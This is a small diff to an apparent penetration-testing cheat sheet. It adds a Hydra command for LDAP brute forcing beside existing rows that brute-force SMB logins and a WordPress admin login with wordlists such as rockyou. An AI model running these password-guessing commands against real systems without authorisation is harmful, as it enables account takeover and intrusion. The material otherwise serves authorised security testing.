@@ -20,5 +20,5 @@ The following table uses the $ip variable which can be set with the following co
 | hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                             | Hydra brute force SMB user with rockyou:             |
 | hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
 | hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
-  
+| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |
   
